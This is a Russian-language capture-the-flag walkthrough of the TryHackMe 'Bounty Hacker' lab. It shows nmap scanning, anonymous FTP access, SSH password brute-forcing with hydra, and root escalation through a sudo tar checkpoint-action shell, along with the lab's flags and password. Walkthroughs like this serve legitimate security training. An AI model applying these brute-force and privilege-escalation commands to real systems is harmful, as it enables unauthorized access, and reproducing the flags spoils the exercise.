# Машина Bounty Hacker Tryhackme

Сканируем машину на наличие открытых портов с помощью утилиты nmap
```
nmap 10.82.174.213
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-11 11:25 -0400
Nmap scan report for 10.82.174.213
Host is up (0.050s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```
Для начала я решил проверить утилитой gobuster директории web интерфейса машины, но кроме images и javascript ничего там не нашел, в файле robots.txt
тоже ничего нет, а если быть конкретнее, то его вообще не существует
Далее решаю проверить ftp, возможно удасться подключиться под anonymous:
```
ftp 10.82.174.213                                                         
Connected to 10.82.174.213.
220 (vsFTPd 3.0.5)
Name (10.82.174.213:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> get locks.txt
local: locks.txt remote: locks.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |*******************************************************************************************************|   418        0.97 MiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (7.92 KiB/s)
ftp> get task.txt
local: task.txt remote: task.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |*******************************************************************************************************|    68      144.99 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (1.28 KiB/s)
```
Как видно из ftp оболочки, я успешно подключился и нашел два интересных файла, а так же вытащил их на свою машину для проверки.
Проверяем, что внутри двух файлов:
```
cat locks.txt
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```
Смею предположить, что это список каких-то паролей, судя по всему от ssh. Проверяю второй файл:
```        
cat task.txt 
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```                                                                                                                                              
Ничего особо интересного тут нет, кроме адресанта. Имя автора - "lin", т.к. никаких других зацепок на поверхности нет, можно в принципе подставить 
это имя в качестве имени пользователя. Далее из свободного у меня остается только ssh, а еще у меня есть список паролей и предполагаемое имя пользователя. Воспользуюсь утилитой hydra, для перебора:
```
hydra -l lin -P locks.txt ssh://10.82.174.213 -t 3
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-11 11:55:44
[DATA] max 3 tasks per 1 server, overall 3 tasks, 26 login tries (l:1/p:26), ~9 tries per task
[DATA] attacking ssh://10.82.174.213:22/
[22][ssh] host: 10.82.174.213   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-11 11:55:55
```
Отлично, пароль найден, а пользователь подошел, самое время пробовать подключиться с получеными кредами по ssh:
```
ssh lin@10.82.174.213 -p 22
The authenticity of host '10.82.174.213 (10.82.174.213)' can't be established.
ED25519 key fingerprint is: SHA256:YtJWACJ1a9kqDPT/CIteLPyune9xIodhidGRhTlqYIw
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.82.174.213' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
lin@10.82.174.213's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2025.
Last login: Mon Aug 11 12:32:35 2025 from 10.23.8.228
lin@ip-10-82-174-213:~/Desktop$ ls
user.txt
lin@ip-10-82-174-213:~/Desktop$ cat user.txt
THM{CR1M3_SyNd1C4T3}
```
Сразу же натыкаюсь на флаг пользователя, отлично, значит я у цели. Далее мне нужно повысить привилегии, запускаю команду sudo -l для проверки программ,
которые я могу запустить от имени суперпользователя
```
lin@ip-10-82-174-213:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on ip-10-82-174-213:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on ip-10-82-174-213:
    (root) /bin/tar
```
Мне везет, и я сразу вижу, что могу запускать утилиту tar от имени администратора. Решаю зайти на gtfobins и найти там готовый скрипт для повышения привилегий с помощью tar.
Скрипт успешно мной найден, пора запустить его от имени администратора:
```
$ sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# whoami                                                                        
root
# ls
user.txt
# cd /root
# ls
root.txt  snap
# cat root.txt
THM{80UN7Y_h4cK3r}
```
Скрипт успешно сработал и я сразу же нахожу флаг рута!
